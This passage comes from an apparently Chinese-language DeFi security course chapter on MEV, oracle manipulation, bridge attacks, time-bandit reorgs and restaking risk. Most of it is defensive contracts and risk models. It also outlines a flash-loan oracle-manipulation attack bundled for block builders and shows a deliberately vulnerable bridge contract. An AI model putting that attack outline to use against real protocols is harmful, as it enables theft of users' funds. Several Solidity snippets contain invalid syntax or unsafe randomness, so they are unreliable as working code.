        // 利润 = 借出的额外资金 - 闪电贷费用 - 交易损耗
    }
}

// 防御机制：延迟价格更新
contract PriceOracleDefense {
    uint256 public constant PRICE_DELAY = 15 minutes;
    uint256 public constant MAX_PRICE_CHANGE = 1000; // 10%
    
    struct PriceData {
        uint256 price;
        uint256 timestamp;
        uint256 cumulativePrice;
        uint256 priceCount;
    }
    
    mapping(address => PriceData) public priceFeeds;
    
    function updatePrice(address token, uint256 newPrice) external {
        PriceData storage data = priceFeeds[token];
        
        // 检查价格变化幅度
        if (data.price > 0) {
            uint256 priceChange = newPrice > data.price ?
                ((newPrice - data.price) * 10000) / data.price :
                ((data.price - newPrice) * 10000) / data.price;
            
            require(priceChange <= MAX_PRICE_CHANGE, "Price change too large");
        }
        
        // 使用TWAP（时间加权平均价格）
        data.cumulativePrice += newPrice;
        data.priceCount++;
        
        // 延迟价格生效
        if (block.timestamp >= data.timestamp + PRICE_DELAY) {
            data.price = data.cumulativePrice / data.priceCount;
            data.timestamp = block.timestamp;
            data.cumulativePrice = 0;
            data.priceCount = 0;
        }
    }
}</code></pre>
                </div>
            </div>

            <h4>10.2.2 MEV演进：PBS与MEV-Boost</h4>
        
        <div class="info-box">
            <p><strong>Proposer-Builder Separation (PBS)</strong>：以太坊合并后的核心架构，将区块提议者（Proposer）和构建者（Builder）分离，从根本上改变了MEV的提取方式。</p>
        </div>
        
        <div class="code-block">
            <div class="code-header">
                TypeScript 代码 <span class="toggle-icon">▼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-typescript">// MEV-Boost架构下的攻击模型
interface MEVBoostBundle {
    transactions: Transaction[];
    blockNumber: number;
    minTimestamp?: number;
    maxTimestamp?: number;
    revertingTxHashes?: string[];
}

class AdvancedMEVAttack {
    private flashbotsRelay: string = "https://relay.flashbots.net";
    private builderEndpoints: Map<string, string>;
    
    constructor() {
        // 多个Builder端点，提高成功率
        this.builderEndpoints = new Map([
            ['flashbots', 'https://relay.flashbots.net'],
            ['bloxroute', 'https://bloxroute.ethical.blxrbdn.com'],
            ['blocknative', 'https://api.blocknative.com/v1']
        ]);
    }
    
    async executeOracleManipulationWithMEV(
        targetProtocol: string,
        manipulationAmount: bigint
    ): Promise<boolean> {
        // 步骤1：构建攻击交易序列
        const bundle: MEVBoostBundle = {
            transactions: [],
            blockNumber: await this.getCurrentBlockNumber() + 1
        };
        
        // 交易 1: 闪电贷
        const flashLoanTx = await this.buildFlashLoanTransaction(
            manipulationAmount
        );
        bundle.transactions.push(flashLoanTx);
        
        // 交易 2: 操纵预言机价格
        const manipulateTx = await this.buildPriceManipulationTx(
            targetProtocol,
            manipulationAmount
        );
        bundle.transactions.push(manipulateTx);
        
        // 交易 3: 利用被操纵的价格
        const exploitTx = await this.buildExploitTransaction(
            targetProtocol
        );
        bundle.transactions.push(exploitTx);
        
        // 交易 4: 还原市场并偿还闪电贷
        const restoreTx = await this.buildRestoreTransaction();
        bundle.transactions.push(restoreTx);
        
        // 步骤2：计算最优贿赂
        const expectedProfit = await this.calculateExpectedProfit(bundle);
        const optimalBribe = this.calculateOptimalBribe(
            expectedProfit,
            await this.getCompetitionLevel()
        );
        
        // 步骤3：提交给多个Builder
        const submissions = await Promise.allSettled(
            Array.from(this.builderEndpoints.entries()).map(
                async ([name, endpoint]) => {
                    return this.submitBundleToBuilder(
                        bundle,
                        endpoint,
                        optimalBribe
                    );
                }
            )
        );
        
        // 检查是否有任何成功提交
        return submissions.some(result => 
            result.status === 'fulfilled' && result.value.included
        );
    }
    
    private calculateOptimalBribe(
        expectedProfit: bigint,
        competitionLevel: number
    ): bigint {
        // 基于竞争程度的动态贿赂策略
        // 高竞争：贿赂高达利润的90%
        // 低竞争：只贿赂利润的50%
        const bribePercentage = 50 + (competitionLevel * 40);
        return (expectedProfit * BigInt(bribePercentage)) / 100n;
    }
    
    private async getCompetitionLevel(): Promise<number> {
        // 分析mempool和最近区块的MEV活动
        const recentBlocks = await this.getRecentBlocks(10);
        const mevActivity = recentBlocks.map(block => 
            this.analyzeMEVActivity(block)
        );
        
        // 返回0-1之间的竞争程度
        return Math.min(1, mevActivity.reduce((a, b) => a + b) / 10);
    }
}</code></pre>
            </div>
        </div>
        
        <h4>10.2.3 跨链桥攻击与稳定币风险</h4>
        
        <div class="theory-section">
            <p>稳定币的跨链桥接版本成为新的攻击向量。攻击者通过攻击最薄弱的跨链桥，可以凭空铸造"包装"稳定币，稀释其价值或导致特定链上的版本脱锚。</p>
            
            <h5>跨链桥攻击类型</h5>
            <ul>
                <li><strong>验证器串谋</strong>：多签验证器合谋铸造假代币</li>
                <li><strong>重入攻击</strong>：利用跨链消息的异步性</li>
                <li><strong>时间差攻击</strong>：利用不同链的确认时间差异</li>
                <li><strong>预言机操纵</strong>：操纵桥接协议的价格预言机</li>
            </ul>
            
            <div class="warning-box">
                <h6>2024年跨链桥风险新动向</h6>
                <ul>
                    <li><strong>原生vs包装版本脱钩</strong>：如wUSDC vs USDC.e价格差异</li>
                    <li><strong>流动性分散化</strong>：同一稳定币在多链上的流动性碎片化</li>
                    <li><strong>级联脱锚风险</strong>：一条链上的问题传播到其他链</li>
                    <li><strong>桥接协议依赖</strong>：对特定桥接协议的过度依赖</li>
                </ul>
            </div>
        </div>
        
        <div class="code-section">
            <div class="code-header" onclick="toggleCode(this)">
                <span>▶ Solidity: 跨链桥攻击向量分析</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-solidity">// 有漏洞的跨链桥合约示例
contract VulnerableBridge {
    mapping(uint256 => bool) public processedNonces;
    mapping(address => uint256) public balances;
    
    // 漏洞1：缺乏严格的nonce管理
    function mint(
        address recipient,
        uint256 amount,
        uint256 nonce,
        bytes[] memory signatures
    ) external {
        require(!processedNonces[nonce], "Already processed");
        require(verifySignatures(recipient, amount, nonce, signatures), "Invalid signatures");
        
        processedNonces[nonce] = true;
        _mint(recipient, amount);
    }
    
    // 漏洞2：时间窗口攻击
    function burnAndBridge(
        uint256 amount,
        uint256 targetChain,
        address targetAddress
    ) external {
        // 烧毁代币
        _burn(msg.sender, amount);
        
        // 发送跨链消息（异步）
        emit BridgeRequest(
            block.chainid,
            targetChain,
            msg.sender,
            targetAddress,
            amount,
            block.timestamp
        );
        
        // 漏洞：没有锁定期，可能在目标链确认前重组
    }
}

// 安全的跨链桥设计
contract SecureBridge {
    uint256 constant CONFIRMATION_BLOCKS = 100;
    uint256 constant BRIDGE_DELAY = 1 hours;
    
    struct BridgeRequest {
        address user;
        uint256 amount;
        uint256 targetChain;
        address targetAddress;
        uint256 timestamp;
        uint256 blockNumber;
        bool processed;
    }
    
    mapping(bytes32 => BridgeRequest) public requests;
    mapping(uint256 => mapping(uint256 => bool)) public processedNonces;
    
    // 多重验证机制
    modifier multiValidation(
        bytes32 requestId,
        bytes[] memory oracleSignatures,
        bytes[] memory validatorSignatures
    ) {
        require(
            verifyOracles(requestId, oracleSignatures) &&
            verifyValidators(requestId, validatorSignatures),
            "Invalid validation"
        );
        _;
    }
    
    // 时间锁定和多重确认
    function initiateBridge(
        uint256 amount,
        uint256 targetChain,
        address targetAddress
    ) external returns (bytes32 requestId) {
        // 锁定代币而非立即烧毁
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        
        requestId = keccak256(
            abi.encodePacked(
                msg.sender,
                amount,
                targetChain,
                targetAddress,
                block.timestamp,
                block.number
            )
        );
        
        requests[requestId] = BridgeRequest({
            user: msg.sender,
            amount: amount,
            targetChain: targetChain,
            targetAddress: targetAddress,
            timestamp: block.timestamp,
            blockNumber: block.number,
            processed: false
        });
        
        emit BridgeInitiated(requestId, msg.sender, amount, targetChain);
    }
    
    // 完成桥接（需要多重验证和时间延迟）
    function completeBridge(
        bytes32 requestId,
        bytes[] memory oracleSignatures,
        bytes[] memory validatorSignatures
    ) external multiValidation(requestId, oracleSignatures, validatorSignatures) {
        BridgeRequest storage request = requests[requestId];
        
        require(!request.processed, "Already processed");
        require(
            block.number >= request.blockNumber + CONFIRMATION_BLOCKS,
            "Insufficient confirmations"
        );
        require(
            block.timestamp >= request.timestamp + BRIDGE_DELAY,
            "Bridge delay not met"
        );
        
        request.processed = true;
        
        // 烧毁锁定的代币
        IERC20(token).burn(request.amount);
        
        emit BridgeCompleted(requestId, request.targetChain);
    }
}</code></pre>
            </div>
        </div>
        
        <div class="code-section">
            <div class="code-header" onclick="toggleCode(this)">
                <span>▶ Python: 跨链桥风险建模</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">import numpy as np
from typing import Dict, List
import networkx as nx

class CrossChainRiskModel:
    """跨链桥风险传播模型"""
    
    def __init__(self):
        self.chains = {}
        self.bridges = {}
        self.liquidity_distribution = {}
        
    def model_bridge_attack_impact(self,
                                 attack_bridge: str,
                                 attack_amount: float,
                                 chain_liquidity: Dict[str, float]) -> Dict:
        """模拟桥接攻击对稳定币系统的影响"""
        
        # 构建链间依赖图
        G = nx.DiGraph()
        for chain, liquidity in chain_liquidity.items():
            G.add_node(chain, liquidity=liquidity)
        
        # 添加桥接关系
        for bridge_id, bridge_info in self.bridges.items():
            G.add_edge(
                bridge_info['source_chain'],
                bridge_info['target_chain'],
                bridge=bridge_id,
                capacity=bridge_info['daily_volume']
            )
        
        # 模拟攻击影响传播
        affected_chains = {attack_bridge.split('_')[0]: attack_amount}
        propagation_rounds = []
        
        for round in range(10):  # 最多10轮传播
            new_affected = {}
            
            for chain, impact in affected_chains.items():
                # 计算对相邻链的影响
                for neighbor in G.neighbors(chain):
                    bridge_capacity = G[chain][neighbor]['capacity']
                    liquidity_ratio = G.nodes[neighbor]['liquidity'] / G.nodes[chain]['liquidity']
                    
                    # 影响传播公式
                    propagated_impact = impact * min(1, bridge_capacity / G.nodes[chain]['liquidity']) * (1 - liquidity_ratio)
                    
                    if neighbor not in new_affected:
                        new_affected[neighbor] = 0
                    new_affected[neighbor] += propagated_impact * 0.7  # 衰减因子
            
            if not new_affected:
                break
                
            affected_chains.update(new_affected)
            propagation_rounds.append(new_affected.copy())
        
        return {
            'directly_affected': attack_bridge.split('_')[0],
            'total_chains_affected': len(affected_chains),
            'total_value_at_risk': sum(affected_chains.values()),
            'propagation_path': propagation_rounds,
            'systemic_risk_score': self.calculate_systemic_risk(affected_chains, chain_liquidity)
        }
    
    def analyze_wrapped_token_risks(self,
                                  native_chain: str,
                                  wrapped_versions: List[Dict]) -> Dict:
        """分析包装版本稳定币的风险"""
        
        risks = {}
        
        for wrapped in wrapped_versions:
            # 流动性风险
            liquidity_risk = 1 - (wrapped['liquidity'] / wrapped['total_supply'])
            
            # 桥接协议风险
            bridge_concentration = max(wrapped['bridge_volumes'].values()) / sum(wrapped['bridge_volumes'].values())
            
            # 价格偏离风险
            historical_depeg = np.std(wrapped['price_history'])
            
            # 综合风险评分
            risk_score = (
                liquidity_risk * 0.3 +
                bridge_concentration * 0.4 +
                historical_depeg * 0.3
            )
            
            risks[wrapped['symbol']] = {
                'risk_score': risk_score,
                'liquidity_risk': liquidity_risk,
                'bridge_concentration': bridge_concentration,
                'depeg_volatility': historical_depeg,
                'recommended_exposure_limit': self.calculate_exposure_limit(risk_score)
            }
        
        return risks
    
    def simulate_cascade_failure(self,
                               initial_failure: str,
                               network_state: Dict) -> List[Dict]:
        """模拟级联失败场景"""
        
        timeline = []
        failed_bridges = {initial_failure}
        current_state = network_state.copy()
        
        time = 0
        while time < 100:  # 100个时间步
            new_failures = set()
            
            for bridge_id, bridge in self.bridges.items():
                if bridge_id in failed_bridges:
                    continue
                
                # 检查桥接压力
                stress = self.calculate_bridge_stress(
                    bridge_id,
                    failed_bridges,
                    current_state
                )
                
                # 失败概率
                failure_prob = 1 - np.exp(-stress * 0.1)
                
                if np.random.random() < failure_prob:
                    new_failures.add(bridge_id)
            
            if new_failures:
                failed_bridges.update(new_failures)
                timeline.append({
                    'time': time,
                    'new_failures': list(new_failures),
                    'total_failed': len(failed_bridges),
                    'system_health': self.calculate_system_health(failed_bridges)
                })
            
            time += 1
            
            # 更新系统状态
            current_state = self.update_state_after_failures(
                current_state,
                failed_bridges
            )
            
            # 检查是否完全崩溃
            if self.calculate_system_health(failed_bridges) < 0.1:
                break
        
        return timeline

# 使用示例
risk_model = CrossChainRiskModel()

# 配置链和桥接信息
chains = {
    'ethereum': {'liquidity': 1000000000},
    'polygon': {'liquidity': 200000000},
    'arbitrum': {'liquidity': 300000000},
    'optimism': {'liquidity': 150000000}
}

# 模拟攻击影响
attack_impact = risk_model.model_bridge_attack_impact(
    attack_bridge='ethereum_polygon_bridge',
    attack_amount=50000000,  # 5000万美元攻击
    chain_liquidity=chains
)

print(f"受影响链数: {attack_impact['total_chains_affected']}")
print(f"总风险价值: ${attack_impact['total_value_at_risk']:,.0f}")
print(f"系统性风险评分: {attack_impact['systemic_risk_score']:.2f}")</code></pre>
            </div>
        </div>
        
        <h4>10.2.4 三明治攻击与MEV防护</h4>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// MEV保护机制
contract MEVProtection {
    
    // 提交-揭示模式防止前置交易
    struct CommitData {
        bytes32 commitment;
        uint256 blockNumber;
        bool revealed;
    }
    
    mapping(address => CommitData) public commits;
    uint256 public constant REVEAL_DELAY = 2; // 2个区块后才能揭示
    
    // 第一步：提交交易哈希
    function commitSwap(bytes32 commitment) external {
        commits[msg.sender] = CommitData({
            commitment: commitment,
            blockNumber: block.number,
            revealed: false
        });
    }
    
    // 第二步：揭示并执行交易
    function revealAndSwap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        uint256 nonce
    ) external {
        CommitData storage commit = commits[msg.sender];
        
        // 验证延迟
        require(
            block.number >= commit.blockNumber + REVEAL_DELAY,
            "Too early to reveal"
        );
        
        // 验证承诺
        bytes32 hash = keccak256(abi.encodePacked(
            tokenIn,
            tokenOut,
            amountIn,
            minAmountOut,
            nonce,
            msg.sender
        ));
        require(hash == commit.commitment, "Invalid commitment");
        require(!commit.revealed, "Already revealed");
        
        commit.revealed = true;
        
        // 执行交易
        _performSwap(tokenIn, tokenOut, amountIn, minAmountOut);
    }
    
    // 批量交易执行，降低MEV机会
    struct SwapRequest {
        address user;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
    }
    
    SwapRequest[] public pendingSwaps;
    
    function batchExecuteSwaps() external {
        require(pendingSwaps.length > 0, "No pending swaps");
        
        // 随机化执行顺序，防止MEV
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            pendingSwaps.length
        )));
        
        // Fisher-Yates洗牌算法
        for (uint256 i = pendingSwaps.length - 1; i > 0; i--) {
            uint256 j = seed % (i + 1);
            SwapRequest memory temp = pendingSwaps[i];
            pendingSwaps[i] = pendingSwaps[j];
            pendingSwaps[j] = temp;
            seed = uint256(keccak256(abi.encodePacked(seed)));
        }
        
        // 执行所有交易
        for (uint256 i = 0; i < pendingSwaps.length; i++) {
            SwapRequest memory swap = pendingSwaps[i];
            _performSwapForUser(
                swap.user,
                swap.tokenIn,
                swap.tokenOut,
                swap.amountIn,
                swap.minAmountOut
            );
        }
        
        delete pendingSwaps;
    }
}

// MEV利润分配机制
contract MEVRedistribution {
    uint256 public mevRewards;
    mapping(address => uint256) public userShares;
    uint256 public totalShares;
    
    // 将MEV利润返还给用户
    function distributeMEVRewards() external {
        uint256 rewards = mevRewards;
        mevRewards = 0;
        
        // 按比例分配给所有参与者
        for (address user in getActiveUsers()) {
            uint256 share = userShares[user];
            if (share > 0) {
                uint256 reward = (rewards * share) / totalShares;
                payable(user).transfer(reward);
            }
        }
    }
}</code></pre>
                </div>
            </div>
            
            <h5>Intent-Based Architecture：从根本上消除MEV</h5>
            <p>2024年的前沿方向是意图架构（Intent-based Architecture），如CowSwap、SUAVE等，通过将用户意图与执行分离来消除MEV：</p>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 意图基础的交易系统
contract IntentBasedTrading {
    
    struct Intent {
        address user;
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 minAmountOut;
        uint256 deadline;
        bytes32 conditionHash;  // 执行条件的哈希
        bool executed;
    }
    
    struct Solution {
        bytes32 intentId;
        address solver;
        uint256 amountOut;
        bytes executionPath;  // 编码的执行路径
        uint256 solverReward;
    }
    
    mapping(bytes32 => Intent) public intents;
    mapping(bytes32 => Solution[]) public solutions;
    mapping(address => bool) public approvedSolvers;
    
    // 用户提交意图
    function submitIntent(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        uint256 deadline,
        bytes calldata conditions
    ) external returns (bytes32 intentId) {
        intentId = keccak256(abi.encodePacked(
            msg.sender,
            tokenIn,
            tokenOut,
            amountIn,
            block.timestamp
        ));
        
        intents[intentId] = Intent({
            user: msg.sender,
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            amountIn: amountIn,
            minAmountOut: minAmountOut,
            deadline: deadline,
            conditionHash: keccak256(conditions),
            executed: false
        });
        
        // 转入代币到合约
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        
        emit IntentSubmitted(intentId, msg.sender, minAmountOut);
    }
    
    // Solver竞争性提交解决方案
    function proposeSolution(
        bytes32 intentId,
        uint256 amountOut,
        bytes calldata executionPath,
        uint256 requiredReward
    ) external onlyApprovedSolver {
        Intent storage intent = intents[intentId];
        require(!intent.executed, "Intent already executed");
        require(block.timestamp < intent.deadline, "Intent expired");
        require(amountOut >= intent.minAmountOut, "Output too low");
        
        // 验证解决方案的有效性
        require(
            validateSolution(intent, executionPath, amountOut),
            "Invalid solution"
        );
        
        solutions[intentId].push(Solution({
            intentId: intentId,
            solver: msg.sender,
            amountOut: amountOut,
            executionPath: executionPath,
            solverReward: requiredReward
        }));
        
        emit SolutionProposed(intentId, msg.sender, amountOut);
    }
    
    // 批量执行最优解决方案
    function executeBatch(
        bytes32[] calldata intentIds
    ) external {
        for (uint256 i = 0; i < intentIds.length; i++) {
            bytes32 intentId = intentIds[i];
            Intent storage intent = intents[intentId];
            
            if (intent.executed || block.timestamp >= intent.deadline) {
                continue;
            }
            
            // 选择最优解决方案
            Solution memory bestSolution = selectBestSolution(intentId);
            
            if (bestSolution.solver != address(0)) {
                // 执行解决方案
                executeSolution(intent, bestSolution);
                intent.executed = true;
                
                emit IntentExecuted(
                    intentId,
                    bestSolution.solver,
                    bestSolution.amountOut
                );
            }
        }
    }
    
    function selectBestSolution(
        bytes32 intentId
    ) internal view returns (Solution memory best) {
        Solution[] storage solutionList = solutions[intentId];
        uint256 bestScore = 0;
        
        for (uint256 i = 0; i < solutionList.length; i++) {
            Solution storage solution = solutionList[i];
            
            // 评分公式：输出数量 - Solver奖励
            uint256 score = solution.amountOut - solution.solverReward;
            
            if (score > bestScore) {
                bestScore = score;
                best = solution;
            }
        }
    }
    
    // SUAVE风格的隐私意图
    contract PrivateIntentPool {
        using SUAVE for bytes;
        
        // 加密的意图存储
        mapping(bytes32 => bytes) private encryptedIntents;
        
        function submitPrivateIntent(
            bytes calldata encryptedIntent,
            bytes32 commitment
        ) external {
            // 验证承诺
            require(
                keccak256(encryptedIntent) == commitment,
                "Invalid commitment"
            );
            
            // 存储加密意图
            bytes32 intentId = keccak256(abi.encodePacked(
                msg.sender,
                block.timestamp
            ));
            encryptedIntents[intentId] = encryptedIntent;
            
            // 通知可信执行环境(TEE)
            emit PrivateIntentSubmitted(intentId, msg.sender);
        }
        
        // 只有TEE可以解密和执行
        function executePrivateIntent(
            bytes32 intentId,
            bytes calldata proof
        ) external onlyTEE {
            bytes memory encryptedIntent = encryptedIntents[intentId];
            
            // 在TEE中解密和执行
            // ...
        }
    }
}</code></pre>
                </div>
            </div>
        </div>
        
        <h4>10.2.4 时间强盗攻击（Time-bandit MEV）</h4>
        
        <div class="warning-box">
            <p><strong>时间强盗攻击</strong>：区块生产者为了捕获过去的MEV而重组链的攻击方式。这种攻击展示了共识层安全与应用层安全的深度交互。</p>
        </div>
        
        <h5>攻击机制分析</h5>
        <div class="code-block">
            <div class="code-header">
                Python 代码 <span class="toggle-icon">▼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">class TimeBanditAttack:
    """时间强盗攻击模型"""
    
    def __init__(self, chain_config: dict):
        self.block_reward = chain_config['block_reward']
        self.reorg_cost = chain_config['reorg_cost']
        self.finality_depth = chain_config['finality_depth']
        
    def calculate_profitability(self, 
                              historical_mev: list,
                              reorg_depth: int) -> dict:
        """计算重组攻击的收益性"""
        
        # 计算可捕获的MEV价值
        capturable_mev = sum(historical_mev[-reorg_depth:])
        
        # 计算重组成本
        reorg_costs = {
            'lost_rewards': self.block_reward * reorg_depth,
            'reputation_cost': self.estimate_reputation_damage(reorg_depth),
            'opportunity_cost': self.calculate_opportunity_cost(reorg_depth)
        }
        
        total_cost = sum(reorg_costs.values())
        
        # 考虑成功概率
        success_probability = self.calculate_success_probability(reorg_depth)
        
        expected_profit = (capturable_mev * success_probability) - total_cost
        
        return {
            'capturable_mev': capturable_mev,
            'total_cost': total_cost,
            'success_probability': success_probability,
            'expected_profit': expected_profit,
            'attack_feasible': expected_profit > 0
        }
    
    def calculate_success_probability(self, reorg_depth: int) -> float:
        """计算重组成功概率"""
        # 随着深度增加，成功率指数下降
        if reorg_depth >= self.finality_depth:
            return 0.0
        
        # 基于网络参数的概率模型
        base_probability = 0.9
        decay_factor = 0.7
        
        return base_probability * (decay_factor ** reorg_depth)
    
    def analyze_stablecoin_vulnerability(self, 
                                       stablecoin_protocol: dict) -> dict:
        """分析稳定币对时间强盗攻击的脆弱性"""
        
        vulnerabilities = []
        
        # 检查清算机制
        if stablecoin_protocol['liquidation_delay'] < self.finality_depth:
            vulnerabilities.append({
                'type': 'liquidation_reversal',
                'severity': 'high',
                'description': '清算可能被回滚，导致不良债务'
            })
        
        # 检查预言机更新
        if stablecoin_protocol['oracle_finality'] < self.finality_depth:
            vulnerabilities.append({
                'type': 'oracle_manipulation',
                'severity': 'critical',
                'description': '预言机价格更新可能被回滚'
            })
        
        # 检查治理决策
        if stablecoin_protocol['governance_delay'] < self.finality_depth * 2:
            vulnerabilities.append({
                'type': 'governance_attack',
                'severity': 'medium',
                'description': '治理决策可能被操纵'
            })
        
        return {
            'vulnerabilities': vulnerabilities,
            'overall_risk': self.calculate_overall_risk(vulnerabilities)
        }
</code></pre>
            </div>
        </div>
        
        <h4>10.2.5 再质押风险（Restaking Risks）</h4>
        
        <div class="info-box">
            <p><strong>🔥 2024年最重要的新兴风险</strong>：随着EigenLayer等再质押协议的兴起，稳定币开始接受流动性再质押代币（LRTs）作为抵押品，引入了前所未有的多层风险叠加。</p>
        </div>
        
        <h5>LRT风险层级分析</h5>
        <div class="code-block">
            <div class="code-header">
                Solidity 代码 <span class="toggle-icon">▼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-solidity">// LRT作为抵押品的风险管理合约
contract LRTCollateralManager {
    
    struct LRTRiskProfile {
        uint256 baseAssetRisk;      // 底层ETH质押风险
        uint256 avssRisk;           // AVS罚没风险
        uint256 protocolRisk;       // LRT协议风险
        uint256 liquidityRisk;      // 流动性风险
        uint256 correlationRisk;    // 相关性风险
    }
    
    struct AVSExposure {
        address avsAddress;
        uint256 stakedAmount;
        uint256 slashingRisk;
        uint256 rewardVolatility;
        bool hasHistoricalSlashing;
    }
    
    mapping(address => LRTRiskProfile) public lrtRiskProfiles;
    mapping(address => AVSExposure[]) public lrtAVSExposures;
    
    // 动态抵押率计算
    function calculateDynamicCollateralRatio(
        address lrtToken,
        uint256 baseRatio
    ) public view returns (uint256) {
        LRTRiskProfile memory risk = lrtRiskProfiles[lrtToken];
        
        // 基础抵押率根据风险调整
        uint256 riskMultiplier = calculateRiskMultiplier(risk);
        
        // 考虑AVS暴露
        uint256 avsRiskPremium = calculateAVSRiskPremium(lrtToken);
        
        // 最终抵押率 = 基础率 * 风险乘数 + AVS风险溢价
        return (baseRatio * riskMultiplier / 100) + avsRiskPremium;
    }
    
    function calculateRiskMultiplier(
        LRTRiskProfile memory risk
    ) internal pure returns (uint256) {
        // 复合风险计算
        uint256 totalRisk = risk.baseAssetRisk +
                           risk.avssRisk +
                           risk.protocolRisk +
                           risk.liquidityRisk;
        
        // 考虑风险相关性（非线性叠加）
        uint256 correlationAdjustment = (totalRisk * risk.correlationRisk) / 10000;
        
        // 风险乘数：100 = 无额外风险，200 = 双倍抵押要求
        return 100 + totalRisk + correlationAdjustment;
    }
    
    // 监控AVS罚没事件
    function handleAVSSlashing(
        address lrtToken,
        address avsAddress,
        uint256 slashingAmount
    ) external onlyOracle {
        // 更新风险评分
        lrtRiskProfiles[lrtToken].avssRisk += calculateSlashingImpact(
            slashingAmount,
            getTotalLRTValue(lrtToken)
        );
        
        // 触发紧急抵押率调整
        if (lrtRiskProfiles[lrtToken].avssRisk > CRITICAL_RISK_THRESHOLD) {
            triggerEmergencyDeleveraging(lrtToken);
        }
        
        emit AVSSlashingDetected(lrtToken, avsAddress, slashingAmount);
    }
}

// 风险传染模型
contract RiskContagionModel {
    
    struct SystemicRiskScenario {
        string description;
        uint256 probability;
        uint256 impactSeverity;
        address[] affectedProtocols;
    }
    
    // 模拟LRT相关的系统性风险
    function simulateContagion(
        address triggerProtocol,
        uint256 initialShock
    ) external view returns (SystemicRiskScenario memory) {
        // 构建协议依赖图
        address[] memory dependentProtocols = getDependentProtocols(triggerProtocol);
        
        // 计算传染路径
        uint256[] memory contagionImpacts = new uint256[](dependentProtocols.length);
        
        for (uint i = 0; i < dependentProtocols.length; i++) {
            // 计算每个协议受到的冲击
            contagionImpacts[i] = calculateContagionImpact(
                initialShock,
                getExposure(dependentProtocols[i], triggerProtocol),
                getProtocolResilience(dependentProtocols[i])
            );
        }
        
        // 评估系统性风险
        return SystemicRiskScenario({
            description: "LRT mass slashing cascade",
            probability: calculateCascadeProbability(contagionImpacts),
            impactSeverity: sum(contagionImpacts),
            affectedProtocols: dependentProtocols
        });
    }
}</code></pre>
            </div>
        </div>
        
        <h5>LRT风险缓释策略</h5>
        <div class="code-block">
            <div class="code-header">
                Python 代码 <span class="toggle-icon">▼</span>
            </div>
            <div class="code-content" style="display: none;">
                <pre><code class="language-python">class LRTRiskMitigation:
    """LRT风险缓释策略实现"""
    
    def __init__(self):
        self.risk_params = {
            'max_lrt_concentration': 0.3,  # 最大LRT集中度
            'avs_diversity_requirement': 5,  # 最小AVS分散度
            'correlation_threshold': 0.7,   # 相关性阈值
            'buffer_requirement': 0.2       # 额外缓冲要求
        }
    
    def design_defensive_strategy(self, 
                                stablecoin_protocol: dict) -> dict:
        """设计针对LRT风险的防御策略"""
        
        strategies = {
            'collateral_limits': self.set_lrt_exposure_limits(),
            'dynamic_parameters': self.create_dynamic_risk_parameters(),
            'monitoring_system': self.design_monitoring_framework(),
            'emergency_procedures': self.define_emergency_responses()
        }
        
        return strategies
    
    def set_lrt_exposure_limits(self) -> dict:
        """设置LRT暴露限制"""
        return {
            'single_lrt_cap': '10% of total collateral',
            'total_lrt_cap': '30% of total collateral',
            'per_avs_exposure': '5% of total collateral',
            'concentration_penalties': {
                '0-10%': 0,
                '10-20%': 5,  # 5%额外抵押要求
                '20-30%': 15  # 15%额外抵押要求
            }
        }
    
    def create_dynamic_risk_parameters(self) -> dict:
        """创建动态风险参数系统"""
        return {
            'oracle_requirements': {
                'lrt_price_sources': 5,  # 需要5个价格源
                'avs_performance_feed': True,
                'slashing_event_feed': True
            },
            'liquidation_adjustments': {
                'lrt_liquidation_bonus': '15%',  # 高于普通抵押品
                'partial_liquidation_enabled': True,
                'grace_period': '2 hours'
            },
            'interest_rate_model': {
                'base_rate_adjustment': '+2%',
                'utilization_curve_steepness': 1.5
            }
        }
    
    def design_monitoring_framework(self) -> dict:
        """设计监控框架"""
        return {
            'real_time_monitors': [
                'avs_performance_tracker',
                'slashing_event_detector',
                'liquidity_depth_monitor',
                'correlation_analyzer'
            ],
            'alert_thresholds': {
                'avs_underperformance': -10,
                'liquidity_drop': -30,
                'correlation_spike': 0.8
            },
            'automated_responses': {
                'increase_collateral_ratio': 'correlation > 0.7',
                'pause_lrt_deposits': 'slashing_detected',
                'trigger_deleveraging': 'liquidity < threshold'
            }
        }
    
    def analyze_systemic_risk(self, market_state: dict) -> dict:
        """分析LRT引入的系统性风险"""
        
        # 构建风险传染矩阵
        contagion_matrix = self.build_contagion_matrix(
            market_state['protocols'],
            market_state['lrt_exposures']
        )
        
        # 运行压力测试
        stress_scenarios = [
            {'name': 'Major AVS Slashing', 'shock': -30},
            {'name': 'EigenLayer Exploit', 'shock': -50},
            {'name': 'Correlated AVS Failure', 'shock': -40}
        ]
        
        results = {}
        for scenario in stress_scenarios:
            impact = self.simulate_shock_propagation(
                contagion_matrix,
                scenario['shock']
            )
            results[scenario['name']] = {
                'direct_impact': impact['direct'],
                'contagion_effect': impact['contagion'],
                'total_system_loss': impact['total'],
                'protocols_at_risk': impact['at_risk_count']
            }
        
        return results
</code></pre>
            </div>
        </div>
        
        <div class="warning-box">
            <h5>⚠️ LRT集成的关键风险点</h5>
            <ul>
                <li><strong>多层罚没风险：</strong>底层ETH + 多个AVS的复合罚没可能</li>
                <li><strong>流动性幻觉：</strong>LRT在压力情况下可能失去流动性</li>
                <li><strong>相关性风险：</strong>多个LRT可能因共同AVS暴露而同时贬值</li>
                <li><strong>治理攻击面：</strong>通过操纵AVS治理间接攻击稳定币</li>
                <li><strong>级联清算：</strong>一个AVS失败可能触发连锁清算</li>
